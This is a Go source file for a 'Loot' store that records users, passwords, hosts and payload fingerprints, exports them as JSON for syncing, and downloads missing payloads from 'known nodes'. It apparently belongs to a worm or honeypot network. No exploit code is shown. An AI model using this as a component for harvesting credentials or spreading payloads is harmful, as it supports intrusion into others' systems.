package main

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"

	"golang.org/x/exp/maps"
)

type LootJSON struct {
	Hosts        []string `json:"hosts"`
	Users        []string `json:"users"`
	Passwords    []string `json:"passwords"`
	Fingerprints []string `json:"fingerprints"`
}

type Loot struct {
	users        map[string]bool
	passwords    map[string]bool
	hosts        map[string]bool
	fingerprints map[string]bool
	payloads     *Payloads
	lock         *sync.Mutex
}

func (l *Loot) HasUser(user string) bool {
	l.lock.Lock()
	defer l.lock.Unlock()

	if _, ok := l.users[user]; !ok {
		return false
	}
	return true
}

func (l *Loot) HasPassword(password string) bool {
	l.lock.Lock()
	defer l.lock.Unlock()

	if _, ok := l.passwords[password]; !ok {
		return false
	}
	return true
}

func (l *Loot) HasHost(host string) bool {
	l.lock.Lock()
	defer l.lock.Unlock()

	if _, ok := l.hosts[host]; !ok {
		return false
	}
	return true
}

func (l *Loot) HasFingerprint(fingerprint string) bool {
	l.lock.Lock()
	defer l.lock.Unlock()

	if _, ok := l.fingerprints[fingerprint]; !ok {
		return false
	}
	return true
}

func (l *Loot) HasPayload(fingerprint string) bool {
	return l.payloads.Has(fingerprint)
}

func (l *Loot) AddUser(user string) bool {
	user = strings.TrimSpace(user)
	if user == "" {
		return false
	}

	if l.HasUser(user) {
		return false
	}
	l.lock.Lock()
	defer l.lock.Unlock()
	l.users[user] = true
	return true
}

func (l *Loot) AddPassword(password string) bool {
	password = strings.TrimSpace(password)
	if password == "" {
		return false
	}

	if l.HasPassword(password) {
		return false
	}
	l.lock.Lock()
	defer l.lock.Unlock()
	l.passwords[password] = true
	return true
}

func (l *Loot) AddHost(host string) bool {
	host = strings.TrimSpace(host)
	if host == "" {
		return false
	}

	if isIPWhitelisted(host) {
		return false // we never add whitelisted hosts
	}
	if l.HasHost(host) {
		return false
	}
	l.lock.Lock()
	defer l.lock.Unlock()
	l.hosts[host] = true
	return true
}

func (l *Loot) AddFingerprint(fingerprint string) bool {
	fingerprint = strings.TrimSpace(fingerprint)
	if fingerprint == "" {
		return false
	}

	if !l.HasFingerprint(fingerprint) {
		l.lock.Lock()
		defer l.lock.Unlock()
		l.fingerprints[fingerprint] = true
	}

	if !l.HasPayload(fingerprint) {
		l.AddPayload(fingerprint)
	}
	return true
}

func (l *Loot) AddPayload(fingerprint string) {
	p := NewPayload()
	p.SetHash(fingerprint)
	if !p.Exists() {
		if !p.Download(fingerprint) { // try to download from known nodes
			// LogErrorLn("Payload %s was not found anywhere", colorFile(p.file))
			return
		}
	}
	l.payloads.Add(p)
}

func (l *Loot) CountUsers() int {
	l.lock.Lock()
	defer l.lock.Unlock()
	return len(l.users)
}

func (l *Loot) CountPasswords() int {
	l.lock.Lock()
	defer l.lock.Unlock()
	return len(l.passwords)
}

func (l *Loot) CountHosts() int {
	l.lock.Lock()
	defer l.lock.Unlock()
	return len(l.hosts)
}

func (l *Loot) CountFingerprints() int {
	l.lock.Lock()
	defer l.lock.Unlock()
	return len(l.fingerprints)
}

func (l *Loot) GetUsers() []string {
	l.lock.Lock()
	defer l.lock.Unlock()
	return maps.Keys(l.users)
}

func (l *Loot) GetPasswords() []string {
	l.lock.Lock()
	defer l.lock.Unlock()
	return maps.Keys(l.passwords)
}

func (l *Loot) GetHosts() []string {
	l.lock.Lock()
	defer l.lock.Unlock()
	return maps.Keys(l.hosts)
}

func (l *Loot) GetFingerprints() []string {
	l.lock.Lock()
	defer l.lock.Unlock()
	return maps.Keys(l.fingerprints)
}

func (l *Loot) JSON() string {
	data := LootJSON{
		Hosts:        l.GetHosts(),
		Users:        l.GetUsers(),
		Passwords:    l.GetPasswords(),
		Fingerprints: l.GetFingerprints(),
	}
	json, err := json.Marshal(data)
	if err != nil {
		LogErrorLn("Could not marshal sync data: %s", colorError(err))
		return ""
	}

	return string(json)
}

func (l *Loot) Fingerprint() string {
	return fmt.Sprintf(
		"%s:%s:%s:%s",
		l.FingerprintHosts(),
		l.FingerprintUsers(),
		l.FingerprintPasswords(),
		l.FingerprintFingerprints(),
	)
}

func (l *Loot) FingerprintHosts() string {
	return StringSliceToSha256(l.GetHosts())
}

func (l *Loot) FingerprintUsers() string {
	return StringSliceToSha256(l.GetUsers())
}

func (l *Loot) FingerprintPasswords() string {
	return StringSliceToSha256(l.GetPasswords())
}

func (l *Loot) FingerprintFingerprints() string {
	return StringSliceToSha256(l.GetFingerprints())
}

func NewLoot() *Loot {
	return &Loot{
		users:        map[string]bool{},
		passwords:    map[string]bool{},
		hosts:        map[string]bool{},
		fingerprints: map[string]bool{},
		payloads:     NewPayloads(),
		lock:         &sync.Mutex{},
	}
}
